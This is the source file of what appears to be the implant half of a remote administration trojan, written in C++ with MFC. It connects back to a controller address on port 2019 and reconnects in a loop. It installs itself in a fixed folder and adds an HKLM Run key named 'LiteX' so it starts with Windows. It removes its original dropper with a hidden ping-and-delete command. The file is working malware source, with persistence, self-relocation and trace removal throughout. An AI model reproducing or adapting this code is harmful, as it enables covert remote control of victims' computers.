
// Server.cpp : ����Ӧ�ó��������Ϊ��
//

#include "stdafx.h"
#include "Server.h"
#include "ServerDlg.h"

#include "KernelManager.h"
#include "Login.h"
#include <shellapi.h>
#include <direct.h>


#pragma comment(lib,"wininet.lib")
#pragma comment(lib, "vfw32.lib")

BOOL    bisUnInstall = FALSE;

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


int main()
{
	// ��ȡ���ߵ�ַ
	CString strAddr;
	GetPrivateProfileString(_T("Login"),_T("IPAddr"),_T("Error"),strAddr.GetBuffer(MAX_PATH),MAX_PATH,WG_INI_PATH);
	strAddr.ReleaseBuffer();

		// ���� ���ߵ�ַ
	HANDLE m_hMutex = CreateMutex(NULL, FALSE, strAddr);
	if (m_hMutex && GetLastError() == ERROR_ALREADY_EXISTS)
	{
		ReleaseMutex(m_hMutex);
		CloseHandle(m_hMutex);
		return 0;
	}

	CClientSocket SocketClient;
	int     nSleep = 0;
	bool	bBreakError = false;
	while (1)
	{
		if (bBreakError != false)
		{
			nSleep = rand();
			Sleep(nSleep % 120000);
		}
		if(bisUnInstall)
		{
			SocketClient.Disconnect();
			break;
		}

		char	lpszHost[256]={0};
		UINT  	dwPort = 0;

    	dwPort = 2019;
		strcat(lpszHost, CStringA(strAddr));

		if(strcmp(lpszHost,"") == 0)
		{
			bBreakError = true;
			continue;
		}

		DWORD dwTickCount = GetTickCount();
		if (!SocketClient.Connect(lpszHost, dwPort))
		{
			bBreakError = true;
			continue;
		}

		DWORD upTickCount = GetTickCount()-dwTickCount;
		CKernelManager	manager(&SocketClient,lpszHost,dwPort);

		SocketClient.SetManagerCallBack(&manager);

		if(SendLoginInfo(&SocketClient,upTickCount) <= 0)
		{
			SocketClient.Disconnect();
			bBreakError = true;
			continue;
		}

		DWORD	dwIOCPEvent;

		do
		{
			dwIOCPEvent = WaitForSingleObject(
				SocketClient.m_hEvent,
				100);
			Sleep(500);
		} while( dwIOCPEvent != WAIT_OBJECT_0 && !bisUnInstall);

		if(bisUnInstall)
		{
			SocketClient.Disconnect();
			break;
		}
	}

	return 0;
}


DWORD __stdcall MainThread()
{	
	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, NULL, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	return 1;
}


// CServerApp

BEGIN_MESSAGE_MAP(CServerApp, CWinAppEx)
	ON_COMMAND(ID_HELP, &CWinApp::OnHelp)
END_MESSAGE_MAP()


// CServerApp ����

CServerApp::CServerApp()
{
	// TODO: �ڴ˴���ӹ�����룬
	// ��������Ҫ�ĳ�ʼ�������� InitInstance ��
}


// Ψһ��һ�� CServerApp ����

CServerApp theApp;



static void WgWriteAutoRun(LPCTSTR szRun)
{
	TCHAR strSubKey[MAX_PATH] = _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, _T("LiteX"), REG_SZ, (TCHAR *)szRun, (DWORD)(_tcslen(szRun) * sizeof(TCHAR)), 1);
	TCHAR strSubKey1[MAX_PATH] = _T("Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers");
	TCHAR strKey[MAX_PATH] = _T("RunAsInvoker");
	WriteRegEx(HKEY_CURRENT_USER, strSubKey1, (TCHAR *)szRun, REG_SZ, strKey, (DWORD)(_tcslen(strKey) * sizeof(TCHAR)), 1);
}

static void WgDeleteStagerAfterExit(LPCTSTR pszPath)
{
	TCHAR szCmd[1024] = {0};
	_stprintf_s(szCmd, _countof(szCmd), _T("cmd.exe /c ping 127.0.0.1 -n 3 >nul & del /f /q \"%s\""), pszPath);
	STARTUPINFO si = {0};
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	PROCESS_INFORMATION pi = {0};
	CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
	if (pi.hProcess) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
}

BOOL IsPathExist(const CString & csPath)
{
	WIN32_FILE_ATTRIBUTE_DATA attrs = { 0 };
	return 0 != GetFileAttributesEx(csPath, GetFileExInfoStandard, &attrs);
}

#include "MainDlg.h"
#include "resource.h"
// CServerApp ��ʼ��
BOOL CServerApp::InitInstance()
{
	CString strName = AfxGetApp()->m_pszAppName;
	int a = strName.ReverseFind('l');
	int b = strName.ReverseFind('v');
	CString strIP = strName.Mid(a+2,b-a-3);

	if (strName.Find(_T("v1")) != -1)//�����氲װ
	{
		CMainDlg dlg;
		dlg.DoModal();
	}

	WgEnsureInstallDir();

	if(strIP.GetLength() != 0)
	{
	    WritePrivateProfileString(_T("Login"),_T("IPAddr"),strIP, WG_INI_PATH);
	}

	TCHAR szPath[MAX_PATH] = {0};
	GetModuleFileName(NULL, szPath, _countof(szPath));

	if (!WgPathsEqual(szPath, WG_EXE_PATH))
	{
		if (!IsPathExist(WG_INI_PATH))
		{
			MainThread();
			return FALSE;
		}

		if (MoveFile(szPath, WG_EXE_PATH))
		{
			WgWriteAutoRun(WG_EXE_PATH);
		}
		else if (CopyFile(szPath, WG_EXE_PATH, FALSE))
		{
			WgWriteAutoRun(WG_EXE_PATH);
			STARTUPINFO si = {0};
			si.cb = sizeof(si);
			PROCESS_INFORMATION pi = {0};
			if (CreateProcess(WG_EXE_PATH, NULL, NULL, NULL, FALSE, 0, NULL, WG_INSTALL_DIR, &si, &pi))
			{
				CloseHandle(pi.hThread);
				CloseHandle(pi.hProcess);
				WgDeleteStagerAfterExit(szPath);
				ExitProcess(0);
			}
		}
	}
	else if (IsPathExist(WG_INI_PATH))
	{
		WgWriteAutoRun(WG_EXE_PATH);
	}

	MainThread();

	return FALSE;
}
